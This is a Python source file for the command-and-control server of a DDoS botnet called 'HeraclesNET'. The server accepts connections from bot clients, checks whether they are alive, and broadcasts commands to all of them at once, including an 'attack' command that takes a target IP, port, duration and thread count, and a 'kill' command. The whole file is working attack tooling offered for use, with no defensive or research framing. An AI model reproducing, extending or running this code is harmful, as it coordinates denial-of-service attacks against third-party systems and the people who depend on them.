#!/usr/bin
import socket
import signal
from time import sleep
from utils.terminal import *
from threading import Thread
from typing import Union, Tuple
from colorama import Back, Fore

# Commands list
# Syntax: [ '<Command Name>', '<Command Description>' ]
commands = [
    ["attack <type> <ip> <port> <time> <threads>", "Start an attack with all Clients at once."],
    ["check                                     ", "Check if clients are still alive or not."],
    ["kill                                      ", "Stop all active attacks."],
    ["list                                      ", "Displays a list of all active clients."],
    ["update                                    ", "Update the list of clients."],
    ["clear                                     ", "Clear the terminal."],
    ["stop                                      ", "Stop the server."],
]

# =============================================================================================================================== #

class Server():
    def __init__(self, connect:Tuple[str, int]=("127.0.0.1", 6969)):
        clear()

        super().__init__()
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)

        self.client_connections = []
        self.all_address = []
        self.stop = False
        if self._bind(connect):
            while True:
                self._take_cmd()

    def exit_gracefully(self, signum:Union[str, object]="", frame:Union[str, object]=""):
        print("\nExiting...")
        self.stop = True
        self.sock.close()
        sleep(1)
        exit(-1)

    def _bind(self, connect:Tuple[str, int]) -> bool:
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(connect)
        self.sock.listen(50)
        self.sock.settimeout(1)

        Thread(target=self.collect).start()
        Thread(target=self.check).start()
        Thread(target=self._update_title).start()

        return True
    
    def _update_title(self):
        while not self.stop:
            set_console_title(f"Heracles | {len(self.client_connections)} Clients | No System is save")

    def _print_help(self):
        total = 0
        help_text = ""
        print(f"{rgb(65, 250, 188, '─×'*10)} Help {rgb(65, 250, 188, '×─'*10)}")
        for x in commands:
            help_text += f"\n[{total}] × {commands[total][0]} | {commands[total][1]}"
            total += 1
        print(help_text + "\n")
        print(f"{rgb(65, 250, 188, '─×'*10)} Help {rgb(65, 250, 188, '×─'*10)}")

    def collect(self):
        while not self.stop:
            try:
                conn, address = self.sock.accept()
                self.client_connections.append(conn)
                self.all_address.append(address)
            except socket.timeout:
                continue
            except socket.error:
                continue
            except Exception as e:
                log(f"[-] An Error occured: {e}")

    def check(self, display:bool=False, always:bool=True):
        while not self.stop:
            c = 0
            for n, tcp in zip(self.all_address, self.client_connections):
                c += 1
                try:
                    tcp.send(str.encode("ping"))
                    if tcp.recv(1024).decode('utf-8') and display:
                        log(f"[+] {str(n[0]) + ':' + str(n[1])} LIVE")
                except:
                    if display:
                        log(f"[-] {str(n[0]) + ':' + str(n[1])} DEAD")
                    del self.all_address[c-1]
                    del self.client_connections[c-1]
                    continue
            if not always:
                break
        sleep(1)    

    def _take_cmd(self):
        cmd = input(f"{Back.LIGHTBLACK_EX}HeraclesNET ×{Back.RESET} ")

        if cmd == "list":
            results = '\n'
            for i, (ip, port) in enumerate(self.all_address):
                results = results + f'[+] {ip}:{port} Connected! \n'
            if results == '':
                log("[-] There are currently no clients connected!")
            else:
                print(f"{rgb(65, 250, 188, '─×'*10)} Client List {rgb(65, 250, 188, '×─'*10)}")
                print(results)
                print(f"{rgb(65, 250, 188, '─×'*10)} Client List {rgb(65, 250, 188, '×─'*10)}")
        
        elif "attack" in cmd:
            for i, (ip, port) in enumerate(self.all_address):
                try:
                    self.client_connections[i].send(cmd.encode())
                    log(f"[+] {ip}:{port} {self.client_connections[i].recv(1024*5).decode('ascii')}")
                except BrokenPipeError:
                    del self.all_address[i]
                    del self.client_connections[i]

        elif cmd == "help":
            self._print_help()

        elif cmd == "clear":
            clear()

        elif cmd == "check":
            self.check(display=True, always=False)

        elif cmd == "kill":
            for i, (ip, port) in enumerate(self.all_address):
                try:
                    self.client_connections[i].send(cmd.encode())
                    log(f"[+]{ip}:{port} {self.client_connections[i].recv(1024*5).decode('ascii')}")
                except BrokenPipeError:
                    del self.all_address[i]
                    del self.client_connections[i]
        
        elif cmd == "stop":
            self.exit_gracefully()

        elif cmd == "update":
            self.check(display=True, always=False)

        else:
            log("[-] Invalid Command")

Server()